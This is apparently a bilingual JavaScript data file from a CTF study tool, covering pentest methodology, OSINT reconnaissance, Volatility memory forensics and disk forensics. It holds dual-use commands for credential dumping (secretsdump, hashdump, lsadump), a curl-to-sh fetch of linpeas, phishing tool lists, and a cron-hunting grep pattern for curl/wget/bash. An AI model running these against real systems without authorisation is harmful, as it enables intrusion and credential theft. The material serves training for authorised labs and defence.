// ─── CTF Bible — Méthodologie & Forensics avancés ────────────────────────────
// Sources: HackTricks (pentesting-methodology, external-recon-methodology,
//          volatility-cheatsheet, linux-forensics, windows-forensics,
//          anti-forensic-techniques) + awesome-pentest README

Object.assign(NODES, {

  // ── MÉTHODOLOGIE PENTEST ──────────────────────────────────────────────────────
  "pentest_methodology": {
    id: "pentest_methodology", title: "Méthodologie Pentest Systématique", title_en: "Systematic Pentest Methodology", category: "recon", icon: "📋",
    description: "Approche méthodique et reproductible pour un pentest selon HackTricks : 0-Physical → 1-Asset Discovery → 2-Network Fun → 3-Port Scan → 4-Service Exploits → 5-Pentest Services → 6-Phishing → 7-Shell → 8-Inside → 9-Exfil → 10-PrivEsc → 11-Loot → 12-Pivot. Automatiser par phase plutôt qu'un seul scanner monolithique.",
    description_en: "Methodical and reproducible approach for pentesting based on HackTricks: 0-Physical → 1-Asset Discovery → 2-Network Fun → 3-Port Scan → 4-Service Exploits → 5-Pentest Services → 6-Phishing → 7-Shell → 8-Inside → 9-Exfil → 10-PrivEsc → 11-Loot → 12-Pivot. Automate by phase rather than a single monolithic scanner.",
    commands: [
      { label: "Initialiser le workspace pentest", label_en: "Initialize pentest workspace", cmd: "mkdir -p pentest/{recon,exploit,loot,notes,reports}\nexport TARGET=10.10.10.X\nexport LHOST=10.10.14.X  # votre IP VPN HTB/THM\necho \"$TARGET\" > pentest/notes/target.txt" },
      { label: "Phase 1 : Pipeline recon moderne (HackTricks 2025)", label_en: "Phase 1: Modern recon pipeline (HackTricks 2025)", cmd: "# Asset discovery + validation en pipeline\nbbot -t company.com -p subdomain-enum cloud-enum code-enum email-enum spider\nhttpx -l hosts.txt -sc -title -td -favicon -jarm -asn -ss -jsonl -o httpx.jsonl\nkatana -list live_hosts.txt -jc -js-crawl -kf all -xhr -fx -jsonl -o katana.jsonl\nnaabu -list live_hosts.txt -top-ports 1000 -exclude-cdn -json -o naabu.jsonl\nnuclei -list live_hosts.txt -as -jsonl -o nuclei.jsonl\n# BBOT agrège subdomains, cloud assets, code leaks en un seul pass\n# httpx valide les endpoints HTTP(S) live et les regroupe par techno/favicon/ASN" },
      { label: "Phase 2 : Port scan (nmap classique)", label_en: "Phase 2: Port scan (classic nmap)", cmd: "# Scan réseau progressif :\nnmap -sn $TARGET/24 -oN pentest/recon/ping_sweep.txt\nnmap -sV -sC --top-ports 1000 -oA pentest/recon/nmap_quick $TARGET\nnmap -sV -sC -p- --min-rate 3000 -oA pentest/recon/nmap_full $TARGET\nsudo nmap -sU --top-ports 20 -oN pentest/recon/nmap_udp $TARGET\n# RustScan (plus rapide) :\nrustscan -a $TARGET --range 1-65535 -- -sV -sC" },
      { label: "Phase 3 : Énumération automatique par phase", label_en: "Phase 3: Automated enumeration by phase", cmd: "# Discovery / validation : BBOT, httpx, naabu\n# Web crawling / endpoint extraction : katana\n# Template-based checks : nuclei\n# AD / Windows estate : netexec / nxcdb\n# Pour chaque service :\n# Web → feroxbuster, nikto, whatweb, wafw00f\n# SMB → crackmapexec smb $TARGET --shares\n# FTP → connexion anonyme, download de tout\n# DNS → zone transfer : dig axfr @$TARGET domain.local\n# SSH → ssh-audit $TARGET" },
      { label: "Phase 4 : Exploitation — prioriser", label_en: "Phase 4: Exploitation — prioritize", cmd: "# 1. CVEs critiques avec exploit public\nsearchsploit $(nmap -sV $TARGET | grep -oP 'service.*' | head -5)\n# 2. Credentials par défaut\n# 3. Config faible (anonymous FTP/SMB, null session)\n# 4. Brute force (Hydra, kerbrute)\n# 5. Vulnérabilités custom (SQLi, LFI, SSTI...)\n# Automation: nuclei -list live_hosts.txt -as\n# Legion (GUI semi-automatique basé sur SPARTA)" },
      { label: "Phase 5 : Post-exploitation (10-PrivEsc → 11-Loot → 12-Pivot)", label_en: "Phase 5: Post-exploitation (10-PrivEsc → 11-Loot → 12-Pivot)", cmd: "# linpeas / winpeas pour PrivEsc automatique :\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# Loot :\n# Chercher credentials dans fichiers de config\n# Dump SAM (Windows): impacket-secretsdump DOMAIN/USER:PASS@TARGET\n# Exfiltration : DET, dnscat2, iodine, QueenSono (ICMP)\n# Pivoting : pivotsuite, chisel, ligolo-ng\n# Persistence : 2-3 mécanismes différents" },
      { label: "Phishing moderne (HackTricks 2025)", label_en: "Modern phishing (HackTricks 2025)", cmd: "# Techniques modernes ciblant le workflow d'identité :\n# 1. OAuth device-code phishing (microsoft.com/devicelogin)\n# 2. QR-based lures → redirect vers device-code flow\n# 3. Helpdesk impersonation → reset MFA\n# Outils :\n# Evilginx2 → MitM reverse proxy (defeat 2FA)\n# Gophish → campagnes phishing\n# GitPhish → GitHub Device Code phishing\n# Modlishka → reverse proxy temps réel\n# SET (Social Engineer Toolkit)" },
      { label: "Documentation en temps réel", label_en: "Real-time documentation", cmd: "# Documenter :\n# - Chaque commande exécutée et son output\n# - Chaque credential trouvé\n# - Chaque vuln identifiée (même non exploitée)\n# - Les chemins non explorés\n# Templates de rapports :\n# Public Pentesting Reports : github.com/juliocesarfort/public-pentesting-reports\n# Collaboration : Dradis, Reconmap, Faraday, PCF (Pentest Collaboration Framework)" }
    ],
    lookfor: [
      "Inventaire complet AVANT d'exploiter quoi que ce soit — une info manquée peut être le point d'entrée",
      "Services sur des ports non-standard → souvent les points d'entrée en CTF",
      "Versionning des services → chercher CVEs (NVD, Exploit-DB, Vulners) avant de tenter autre chose",
      "Credentials réutilisés entre services → tester partout (CrackMapExec --continue-on-success)",
      "BBOT agrège les résultats en une seule passe : subdomains + cloud + code leaks"
    ],
    lookfor_en: [
      "Complete inventory BEFORE exploiting anything — a missed piece of info may be the entry point",
      "Services on non-standard ports → often the entry points in CTF",
      "Service versioning → look for CVEs (NVD, Exploit-DB, Vulners) before attempting anything else",
      "Reused credentials across services → test everywhere (CrackMapExec --continue-on-success)",
      "BBOT aggregates results in a single pass: subdomains + cloud + code leaks"
    ],
    tips: [
      "Ne jamais sauter à l'exploitation sans avoir terminé la phase de recon",
      "Sauvegarder tous les outputs nmap dès le début avec -oA (XML + grepable + normal)",
      "Tester les credentials trouvés sur TOUS les services ouverts immédiatement avec netexec/CME",
      "En CTF : flag user.txt souvent dans /home/USER/user.txt, root dans /root/root.txt",
      "CVE-2025-61260 : Codex CLI auto-exec MCP — inspecter .codex/, .cursor/ dans les repos avant d'exécuter"
    ],
    tips_en: [
      "Never jump to exploitation without completing the recon phase",
      "Save all nmap outputs from the start with -oA (XML + grepable + normal)",
      "Test found credentials on ALL open services immediately with netexec/CME",
      "In CTF: user.txt flag often at /home/USER/user.txt, root at /root/root.txt",
      "CVE-2025-61260: Codex CLI auto-exec MCP — inspect .codex/, .cursor/ in repos before executing"
    ],
    choices: [
      { label: "Recon terminée → services identifiés → exploiter", label_en: "Recon done → services identified → exploit", next: "start", icon: "🎯" },
      { label: "OSINT nécessaire (domaine, personne, organisation)", label_en: "OSINT needed (domain, person, organization)", next: "osint", icon: "🔍" },
      { label: "Foothold obtenu → post-exploitation", label_en: "Foothold obtained → post-exploitation", next: "shell_stabilize", icon: "🐚" },
      { label: "Arsenal d'outils par catégorie", label_en: "Tool arsenal by category", next: "awesome_tools", icon: "🛠️" }
    ]
  },

  // ── OSINT ─────────────────────────────────────────────────────────────────────
  "osint": {
    id: "osint", title: "OSINT — Open Source Intelligence", title_en: "OSINT — Open Source Intelligence", category: "recon", icon: "🔭",
    description: "Collecte d'informations sur une cible depuis des sources publiques. Méthodologie HackTricks : 1-Acquisitions/ASN → 2-Reverse Whois → 3-DNS/Subdomains → 4-Certificate Transparency → 5-Favicon Hash → 6-GitHub Leaks → 7-Shodan/Censys. Construire une liste d'assets validée AVANT de scanner.",
    description_en: "Gathering information about a target from public sources. HackTricks methodology: 1-Acquisitions/ASN → 2-Reverse Whois → 3-DNS/Subdomains → 4-Certificate Transparency → 5-Favicon Hash → 6-GitHub Leaks → 7-Shodan/Censys. Build a validated asset list BEFORE scanning.",
    commands: [
      { label: "ASN et IP ranges (HackTricks)", label_en: "ASN and IP ranges (HackTricks)", cmd: "# Trouver les ASN d'une organisation :\namass intel -org tesla\namass intel -asn 8911,50313,394161\n# Lookup par nom/IP/domaine :\n# bgp.he.net, bgpview.io, ipinfo.io\n# BBOT agrège les ASNs automatiquement :\nbbot -t tesla.com -f subdomain-enum\n# IP et ASN d'un domaine : ipv4info.com" },
      { label: "Acquisitions, Reverse Whois, Trackers", label_en: "Acquisitions, Reverse Whois, Trackers", cmd: "# Acquisitions : crunchbase.com, Wikipedia, OpenCorporates, GLEIF LEI\n# Reverse Whois (trouver d'autres domaines via même email/org) :\n# viewdns.info/reversewhois/ (gratuit)\n# reversewhois.io (gratuit)\n# DomLink : amass intel -d tesla.com -whois\n# Trackers partagés (Google Analytics, Adsense ID) :\n# BuiltWith, Publicwww, SpyOnWeb, Udon" },
      { label: "Subdomains — pipeline complet (HackTricks)", label_en: "Subdomains — full pipeline (HackTricks)", cmd: "# BBOT (recommandé) :\nbbot -t tesla.com -f subdomain-enum\nbbot -t tesla.com -f subdomain-enum -rf passive  # passif seulement\nbbot -t tesla.com -f subdomain-enum -m naabu gowitness -n my_scan -o .\n\n# Amass :\namass enum -active -ip -d tesla.com\n\n# Subfinder :\nsubfinder -d tesla.com -silent\n\n# theHarvester (multi-sources) :\ntheHarvester -d tesla.com -b 'anubis,baidu,bing,crtsh,dnsdumpster,google,hackertarget,hunter,linkedin,securityTrails,virustotal'\n\n# Assetfinder :\nassetfinder --subs-only tesla.com\n\n# crt.sh (API gratuite) :\ncurl -s 'https://crt.sh/?q=%25.tesla.com' | grep -oE '[\.a-zA-Z0-9-]+\.tesla\.com' | sort -u" },
      { label: "DNS — zone transfer, brute force, historique", label_en: "DNS — zone transfer, brute force, history", cmd: "# Zone transfer :\ndnsrecon -a -d tesla.com\ndig axfr @ns1.target.com target.com\n# Reverse DNS massif :\ndnsrecon -r 157.240.221.35/24 -n 8.8.8.8\n# massdns, dnsx pour grands ranges\n# Historique DNS (subdomains oubliés) :\n# securitytrails.com, community.riskiq.com (PassiveTotal)\n# farsightsecurity.com/solutions/dnsdb/\n# Brute force :\nsubbrute tesla.com\ngobuster dns -d tesla.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt" },
      { label: "Certificate Transparency & Favicon Hash", label_en: "Certificate Transparency & Favicon Hash", cmd: "# Certificate Transparency :\ncurl -s 'https://crt.sh/?q=%25.tesla.com&output=json' | python3 -m json.tool | grep 'name_value'\n# certspotter.com, search.censys.io, chaos.projectdiscovery.io\n# chaos-client : chaos -d tesla.com\n\n# Favicon hash → trouver tous les assets avec la même icône :\nhttpx -l targets.txt -favicon  # calcule les hashes\nshodan search org:\"Target\" http.favicon.hash:116323821 --fields ip_str,port\n# Shodan via SSL :\nssl:\"Tesla Motors\"  # trouver assets via cert" },
      { label: "Google Dorks — recherches avancées", label_en: "Google Dorks — advanced searches", cmd: "# Fichiers sensibles :\nsite:target.com filetype:pdf OR filetype:xls OR filetype:doc\nsite:target.com inurl:admin OR inurl:login OR inurl:panel\n# Credentials exposés :\nsite:target.com 'password' OR 'credential' OR 'api_key'\n# Fichiers de config :\nsite:target.com ext:env OR ext:conf OR ext:config\n# GHDB : exploit-db.com/google-hacking-database\n# pagodo → automatiser le GHDB scraping\npython3 pagodo.py -d target.com -g dorks.txt\n# fast-recon, dorkbot, BinGoo" },
      { label: "GitHub — secrets et code leaks (HackTricks)", label_en: "GitHub — secrets and code leaks (HackTricks)", cmd: "# Dorks modernes :\n# GitHub tokens : ghp_ gho_ ghu_ ghs_ ghr_ github_pat_\n# AWS : AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY\n# Cloud : GOOGLE_API_KEY, AZURE_TENANT_ID, OPENAI_API_KEY\n\n# TruffleHog v3 (org-wide, avec vérification live) :\nexport GITHUB_TOKEN=<token>\ntrufflehog github --org Target --results=verified \\\n  --include-wikis --issue-comments --pr-comments --gist-comments\n\n# Gitleaks v8 (historique git) :\ngitleaks detect -v --source .\ngitleaks detect --source <repo> --log-opts='--all'\n\n# Nosey Parker (haute performance) :\nnoseyparker scan --datastore np.db <path|repo>\nnoseyparker report --datastore np.db\n\n# ggshield (GitGuardian, pre-commit/CI) :\nggshield secret scan repo <path-or-url>\nggshield secret scan path -r .\n\n# Scan org entière via gh CLI + gitleaks :\ngh repo list Target --limit 1000 --json nameWithOwner,url \\\n| jq -r '.[].url' | while read -r r; do\n  tmp=$(mktemp -d); git clone --depth 1 \"$r\" \"$tmp\" && \\\n  gitleaks detect --source \"$tmp\" -v || true; rm -rf \"$tmp\";\ndone" },
      { label: "Shodan / Censys — reconnaissance d'infrastructure", label_en: "Shodan / Censys — infrastructure reconnaissance", cmd: "# CLI Shodan :\nshodan search 'org:\"Target Corp\"'\nshodan host TARGET_IP\nshodan domain target.com\nshodan search 'hostname:target.com http.title:\"Admin\"'\nshodan search 'ssl:\"Tesla Motors\"'\n\n# Censys (subdomain finder) :\nexport CENSYS_API_ID=...\nexport CENSYS_API_SECRET=...\npython3 censys-subdomain-finder.py tesla.com\n\n# ZoomEye : zoomeye.org\n# DataSploit (OSINT visualizer) : Shodan + Censys + EmailHunter\n# Spiderfoot : spiderfoot.net (multi-source OSINT automation)" },
      { label: "People, emails, réseaux sociaux", label_en: "People, emails, social networks", cmd: "# theHarvester (emails, noms, sous-domaines) :\ntheHarvester -d target.com -b google,linkedin,hunter\n# Sherlock (username across platforms) :\nsherlock username\n# Maigret (plus complet) :\nmaigret username\n# Hunter.io : emails d'une organisation (web)\n# FOCA : métadonnées de documents (Google, Bing, DuckDuckGo)\nmetagoofil -d target.com -t pdf,doc,xls -l 100 -o output/\n# SimplyEmail : email recon rapide\n# WhatBreach : vérifier si email dans des fuites connues\n# EyeWitness : screenshots + default creds\neyewitness -f hosts.txt --web" }
    ],
    lookfor: [
      "Sous-domaines non référencés → panels d'admin cachés, environnements de staging",
      "Code source sur GitHub avec des credentials ou clés API — scanner avec TruffleHog/Gitleaks",
      "Emails d'employés → format connu → cibles pour phishing ou password spray",
      "Technologies exposées sur Shodan → versions → CVEs",
      "Anciens sous-domaines via historique DNS PassiveTotal → subdomain takeover possible",
      "Acquisitions récentes → assets sous-supervisés avec config faible",
      "Trackers partagés (Google Analytics ID identique) → deux sites gérés par la même équipe"
    ],
    lookfor_en: [
      "Unlisted subdomains → hidden admin panels, staging environments",
      "Source code on GitHub with credentials or API keys — scan with TruffleHog/Gitleaks",
      "Employee emails → known format → targets for phishing or password spray",
      "Technologies exposed on Shodan → versions → CVEs",
      "Old subdomains via PassiveTotal DNS history → possible subdomain takeover",
      "Recent acquisitions → under-supervised assets with weak configuration",
      "Shared trackers (identical Google Analytics ID) → two sites managed by the same team"
    ],
    tips: [
      "BBOT est la meilleure option all-in-one 2025 : subdomains + cloud + code leaks en un pass",
      "crt.sh est gratuit et très efficace pour trouver des sous-domaines via certificats SSL",
      "TruffleHog v3 avec --results=verified évite les faux positifs en vérifiant les credentials live",
      "Favicon hash dans httpx puis pivot dans Shodan → trouver tous les assets d'une org",
      "Documenter chaque information trouvée : une info isolée devient utile combinée à d'autres"
    ],
    tips_en: [
      "BBOT is the best all-in-one option for 2025: subdomains + cloud + code leaks in one pass",
      "crt.sh is free and very effective for finding subdomains via SSL certificates",
      "TruffleHog v3 with --results=verified avoids false positives by verifying credentials live",
      "Favicon hash in httpx then pivot in Shodan → find all assets of an org",
      "Document every piece of information found: an isolated fact becomes useful when combined with others"
    ],
    choices: [
      { label: "Sous-domaines trouvés → énumérer les services", label_en: "Subdomains found → enumerate services", next: "web_initial", icon: "🌐" },
      { label: "Credentials dans des fuites → tester l'accès", label_en: "Credentials in leaks → test access", next: "credentials_found", icon: "🏆" },
      { label: "Infrastructure cartographiée → lancer les scans", label_en: "Infrastructure mapped → launch scans", next: "start", icon: "🎯" }
    ]
  },

  // ── FORENSICS MÉMOIRE ─────────────────────────────────────────────────────────
  "forensics_memory": {
    id: "forensics_memory", title: "Forensics Mémoire — Volatility 2/3", title_en: "Memory Forensics — Volatility 2/3", category: "ctf", icon: "🧠",
    description: "Analyse d'un dump mémoire RAM avec Volatility 2 et 3. Volatility 3 détecte l'OS automatiquement (plus besoin de profil) mais la syntaxe est différente. Les plugins 'list' parcourent les structures kernel (rapides, manipulables par malware) ; les plugins 'scan' carve la mémoire brute (plus lents, trouvent les processus cachés).",
    description_en: "Analyze a RAM memory dump with Volatility 2 and 3. Volatility 3 auto-detects the OS (no profile needed) but the syntax differs. 'list' plugins walk kernel structures (fast, manipulable by malware); 'scan' plugins carve raw memory (slower, find hidden processes).",
    commands: [
      { label: "Identifier le profil/OS", label_en: "Identify profile/OS", cmd: "# Volatility 2 — identifier le profil :\nvolatility imageinfo -f file.dmp\nvolatility kdbgscan -f file.dmp\n# kdbgscan > imageinfo : identifie positivement le bon profil + adresse KDBG\n# Vérifier que PsActiveProcessHead montre des processus (sinon mauvais profil)\nexport PROFILE=Win7SP1x86_23418\n\n# Volatility 3 — détection automatique :\nvol.py -f file.dmp windows.info.Info\nvol.py -f file.dmp banners.Banners  # pour Linux" },
      { label: "Hashes et credentials (SAM, LSA, cache)", label_en: "Hashes and credentials (SAM, LSA, cache)", cmd: "# Volatility 3 :\nvol.py -f file.dmp windows.hashdump.Hashdump    # SAM+SYSTEM (NTLM)\nvol.py -f file.dmp windows.cachedump.Cachedump  # domain cached credentials\nvol.py -f file.dmp windows.lsadump.Lsadump     # LSA secrets\n\n# Volatility 2 :\nvolatility --profile=$PROFILE hashdump -f file.dmp\nvolatility --profile=$PROFILE cachedump -f file.dmp\nvolatility --profile=$PROFILE lsadump -f file.dmp\n\n# Après extraction → cracker avec hashcat -m 1000 (NTLM) ou crackstation.net" },
      { label: "Lister et analyser les processus", label_en: "List and analyze processes", cmd: "# Volatility 3 :\nvol.py -f file.dmp windows.pstree.PsTree   # arbre (non caché)\nvol.py -f file.dmp windows.pslist.PsList   # liste EPROCESS\nvol.py -f file.dmp windows.psscan.PsScan  # processus cachés par malware\n\n# Volatility 2 :\nvolatility --profile=$PROFILE pstree -f file.dmp\nvolatility --profile=$PROFILE pslist -f file.dmp\nvolatility --profile=$PROFILE psscan -f file.dmp    # via pool-tag scanning\nvolatility --profile=$PROFILE psxview -f file.dmp   # comparaison multi-méthodes\n\n# Comparer pslist vs psscan → différences = processus cachés (DKOM)" },
      { label: "Commandes exécutées + variables d'environnement", label_en: "Executed commands + environment variables", cmd: "# Volatility 3 :\nvol.py -f file.dmp windows.cmdline.CmdLine          # args ligne de commande\nvol.py -f file.dmp windows.envars.Envars            # env variables\nvol.py -f file.dmp windows.envars.Envars --pid 1234\n\n# Volatility 2 :\nvolatility --profile=$PROFILE cmdline -f file.dmp\nvolatility --profile=$PROFILE consoles -f file.dmp   # historique + output cmd.exe\nvolatility --profile=$PROFILE envars -f file.dmp\n# Si cmd.exe terminé avant le dump → chercher dans conhost.exe (Windows 7+)" },
      { label: "Réseau — connexions et sockets", label_en: "Network — connections and sockets", cmd: "# Volatility 3 :\nvol.py -f file.dmp windows.netscan.NetScan\n\n# Volatility 2 :\nvolatility --profile=$PROFILE netscan -f file.dmp\nvolatility --profile=$PROFILE connections -f file.dmp   # XP et 2003 seulement\nvolatility --profile=$PROFILE connscan -f file.dmp\nvolatility --profile=$PROFILE sockets -f file.dmp" },
      { label: "DLLs, handles, services, SIDs", label_en: "DLLs, handles, services, SIDs", cmd: "# DLLs :\nvol.py -f file.dmp windows.dlllist.DllList --pid 1234\nvol.py -f file.dmp windows.dumpfiles.DumpFiles --pid 1234\nvolatility --profile=$PROFILE dlllist --pid=3152 -f file.dmp\nvolatility --profile=$PROFILE dlldump --pid=3152 --dump-dir=. -f file.dmp\n\n# Services :\nvol.py -f file.dmp windows.svcscan.SvcScan\nvolatility --profile=$PROFILE svcscan -f file.dmp\n\n# Handles (fichiers ouverts par un processus) :\nvol.py -f file.dmp windows.handles.Handles --pid 1234\n\n# SIDs et privilèges :\nvol.py -f file.dmp windows.getsids.GetSIDs --pid 1234\nvol.py -f file.dmp windows.privileges.Privs | grep 'SeDebugPrivilege\\|SeImpersonatePrivilege'" },
      { label: "Registry — clés et UserAssist", label_en: "Registry — keys and UserAssist", cmd: "# Volatility 2 :\nvolatility --profile=$PROFILE hivelist -f file.dmp\nvolatility --profile=$PROFILE printkey -K 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -f file.dmp\n# UserAssist (programmes exécutés + nb de fois) :\nvol.py -f file.dmp windows.registry.userassist.UserAssist\nvolatility --profile=$PROFILE userassist -f file.dmp" },
      { label: "Fichiers en mémoire — scan et extraction", label_en: "Files in memory — scan and extraction", cmd: "# Lister les fichiers en mémoire :\nvolatility --profile=$PROFILE filescan -f file.dmp | grep -i '.txt\\|.doc\\|flag'\nvol.py -f file.dmp windows.filescan.FileScan | grep -i flag\n\n# Extraire un fichier (offset depuis filescan) :\nvolatility --profile=$PROFILE dumpfiles -Q OFFSET -D ./dump/ -f file.dmp\nvol.py -f file.dmp windows.dumpfiles.DumpFiles --virtaddr OFFSET\n\n# Dump d'un processus entier :\nvolatility --profile=$PROFILE memdump -p PID -D conhost/ -f file.dmp" },
      { label: "Strings par processus + YARA scan", label_en: "Strings by process + YARA scan", cmd: "# Strings attribués par processus :\nstrings file.dmp > /tmp/strings.txt\nvol.py -f file.dmp windows.strings.Strings --strings-file /tmp/strings.txt\n\n# YARA scan :\nvol.py -f file.dmp windows.vadyarascan.VadYaraScan --yara-rules 'https://' --pid 3692 3840\nvol.py -f file.dmp yarascan.YaraScan --yara-rules 'https://'\nvolatility --profile=$PROFILE yarascan -Y 'https://' -p 3692,3840 -f file.dmp\n\n# Chercher le flag directement :\nstrings file.dmp | grep -i 'flag{\\|CTF{'\nvol.py -f file.dmp windows.vadyarascan.VadYaraScan --yara-rules 'flag{'" },
      { label: "Détection de malware — malfind + injections", label_en: "Malware detection — malfind + injections", cmd: "# Injection de code (shellcode, DLL injection) :\nvolatility --profile=$PROFILE malfind -f file.dmp\nvolatility --profile=$PROFILE malfind -p PID --dump-dir=./malware/ -f file.dmp\n# Comparer les DLL chargées :\nvolatility --profile=$PROFILE dlllist -p PID -f file.dmp\n# Processus avec droits élevés suspects :\nvol.py -f file.dmp windows.privileges.Privs | grep 'SeImpersonatePrivilege\\|SeBackupPrivilege\\|SeDebugPrivilege'\n# AutoVolatility3 (tous les plugins en parallèle) :\npython3 autovol3.py -f MEMFILE -o OUT_DIR -s full" }
    ],
    lookfor: [
      "Processus suspects : noms similaires à des processus légitimes (svchost.exe vs scvhost.exe)",
      "Différences pslist vs psscan → processus cachés par DKOM (malware)",
      "Connexions vers des IPs externes inconnues → C2 potentiel",
      "Hashes NTLM → crackables ou utilisables en pass-the-hash",
      "Historique de commandes : commandes PowerShell encodées, téléchargements suspects",
      "Processus injectés (malfind) → shellcode ou DLL injection",
      "UserAssist → quels programmes ont été exécutés et combien de fois"
    ],
    lookfor_en: [
      "Suspicious processes: names similar to legitimate processes (svchost.exe vs scvhost.exe)",
      "Differences between pslist vs psscan → processes hidden by DKOM (malware)",
      "Connections to unknown external IPs → potential C2",
      "NTLM hashes → crackable or usable in pass-the-hash",
      "Command history: encoded PowerShell commands, suspicious downloads",
      "Injected processes (malfind) → shellcode or DLL injection",
      "UserAssist → which programs were executed and how many times"
    ],
    tips: [
      "Volatility 3 détecte automatiquement l'OS — pas besoin de profil mais syntaxe différente",
      "strings memory.dmp | grep -i 'flag{\\|CTF{' avant Volatility → souvent suffisant en CTF",
      "kdbgscan est plus fiable qu'imageinfo : vérifier que PsActiveProcessHead liste des processus",
      "conhost.exe conserve l'historique de cmd.exe même après fermeture de la session",
      "autoVolatility3 (H3xKatana) lance tous les plugins en parallèle : gain de temps considérable"
    ],
    tips_en: [
      "Volatility 3 auto-detects the OS — no profile needed but different syntax",
      "strings memory.dmp | grep -i 'flag{\\|CTF{' before Volatility → often sufficient in CTF",
      "kdbgscan is more reliable than imageinfo: verify PsActiveProcessHead lists processes",
      "conhost.exe retains cmd.exe history even after the session is closed",
      "autoVolatility3 (H3xKatana) runs all plugins in parallel: significant time saver"
    ],
    choices: [
      { label: "Credentials/hashes trouvés → les utiliser", label_en: "Credentials/hashes found → use them", next: "credentials_found", icon: "🏆" },
      { label: "Flag dans les fichiers extraits !", label_en: "Flag in extracted files!", next: "flag_found", icon: "🏁" },
      { label: "Forensics disque nécessaire", label_en: "Disk forensics needed", next: "forensics_disk", icon: "💾" }
    ]
  },

  // ── FORENSICS DISQUE ──────────────────────────────────────────────────────────
  "forensics_disk": {
    id: "forensics_disk", title: "Forensics Disque — Linux & Windows", title_en: "Disk Forensics — Linux & Windows", category: "ctf", icon: "💾",
    description: "Analyser une image disque (.dd, .img, .E01) ou un système live. Linux forensics (LiME pour dump mémoire, dcfldd pour image, fls/icat de Sleuth Kit). Windows forensics : artefacts clés — Prefetch, Event Logs, Registry, LNK, Jumplists, Volume Shadow Copies, $MFT, ADS.",
    description_en: "Analyze a disk image (.dd, .img, .E01) or a live system. Linux forensics (LiME for memory dump, dcfldd for imaging, fls/icat from Sleuth Kit). Windows forensics: key artifacts — Prefetch, Event Logs, Registry, LNK, Jumplists, Volume Shadow Copies, $MFT, ADS.",
    commands: [
      { label: "Acquisition d'image disque (Linux forensics)", label_en: "Disk image acquisition (Linux forensics)", cmd: "# Image raw avec vérification hash :\ndcfldd if=/dev/sdc of=/media/usb/pc.image hash=sha256 hashwindow=1M hashlog=/media/usb/pc.hashes\n# dd classique :\ndd if=<subject device> of=<image file> bs=512\n# Capture mémoire avec LiME :\nmake -C /lib/modules/<kernel version>/build M=$PWD\nsudo insmod lime.ko 'path=/home/sansforensics/mem_dump.bin format=lime'\n# LiME via réseau :\nsudo insmod lime.ko 'path=tcp:4444 format=lime'" },
      { label: "Identification et montage de l'image", label_en: "Image identification and mounting", cmd: "# Identifier l'image :\nfile disk.img\nimg_stat -t evidence.img\nfsstat -i raw -f ext4 disk.img\n# Lister les partitions :\nmmls disk.img\nfdisk -l disk.img\n# Calculer l'offset et monter en lecture seule :\nsudo mount -o loop,ro,offset=$(python3 -c 'print(2048*512)') disk.img /mnt/disk\n# Lister les fichiers (Sleuth Kit) :\nfls -i raw -f ext4 disk.img\nfls -i raw -f ext4 disk.img 12  # contenu d'un répertoire\nicat -i raw -f ext4 disk.img 16 > recovered_file  # extraire par inode" },
      { label: "Sleuthkit — fichiers supprimés et timeline", label_en: "Sleuthkit — deleted files and timeline", cmd: "# Lister TOUS les fichiers (inclus supprimés) :\nfls -r -o OFFSET disk.img | grep -v '!'\n# Métadonnées d'un inode :\nistat -o OFFSET disk.img INODE_NUMBER\n# Extraire un fichier :\nicat -o OFFSET disk.img INODE_NUMBER > recovered_file\n# Timeline MACTIME :\nfls -m / -r -o OFFSET disk.img > bodyfile.txt\nmactime -b bodyfile.txt > timeline.txt\nmactime -b bodyfile.txt -d 2024-01-01 2024-12-31 > timeline_filtered.csv" },
      { label: "Récupérer des fichiers supprimés", label_en: "Recover deleted files", cmd: "# Foremost (par magic bytes) :\nforemost -i disk.img -o ./recovered/ -v\n# Photorec (interactif, très efficace) :\nphotorec disk.img\n# Scalpel :\nscalpel disk.img -o ./output/\n# Chercher des magic bytes manuellement :\ngrep -abo 'PK\\x03\\x04' disk.img | head  # ZIP\ngrep -abo '\\x89PNG' disk.img | head     # PNG\ngrep -abo 'JFIF' disk.img | head         # JPEG" },
      { label: "Artefacts Linux — autostart et persistence", label_en: "Linux artifacts — autostart and persistence", cmd: "# Infos système de base :\ndate; uname -a; ifconfig -a; ps -ef; netstat -anp; lsof -V\ncat /etc/passwd; cat /etc/shadow; lsmod\nfind /directory -type f -mtime -1 -print  # modifiés la dernière minute\n\n# Scheduled tasks (cron) :\ncat /var/spool/cron/crontabs/* /etc/cron* /etc/anacrontab\n# Hunt cron abuse :\ngrep -R --line-number -E 'curl|wget|/bin/sh|python|bash -c' /etc/cron.*/* 2>/dev/null\n\n# Systemd timers et transient units :\nsystemctl list-timers --all\nfind /etc/systemd/system /run/systemd/system -name '*.timer' -o -name '*.service' -ls\nfind /run/systemd/transient -maxdepth 2 -type f -ls 2>/dev/null\n\n# Services et autostart :\n# /etc/init.d/, /etc/systemd/system/, ~/.config/autostart/\n# /etc/profile.d/, ~/.bashrc, ~/.bash_profile\n# Cloud C2 (Cloudflare Tunnel) :\nps aux | grep -E '[c]loudflared|trycloudflare'" },
      { label: "Artefacts Windows — Prefetch, Registry, LNK", label_en: "Windows artifacts — Prefetch, Registry, LNK", cmd: "# Prefetch (programmes exécutés) :\n# C:\\Windows\\Prefetch\\{prog}-{hash}.pf\npecmd.exe -d C:\\Windows\\Prefetch --csv output/\n# Registry SAM (hashes) :\n# SAM\\Domains\\Account\\Users → username, RID, login times\n# Récupérer avec volatility ou RegRipper\n# NTUSER.DAT → HKCU (profil utilisateur)\n\n# LNK files (recent files) :\n# C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk\nlecmd.exe -d C:\\Users\\student\\Desktop\\LNKs --csv output/\n\n# Jumplists :\n# AutomaticDestinations : {id}.automaticDestinations-ms\n# CustomDestinations : {id}.customDestinations-ms\n# JumplistExplorer (GUI) pour analyser\n\n# Volume Shadow Copies :\n# \\System Volume Information\\{UID}\n# ShadowCopyView (nirsoft) pour inspecter" },
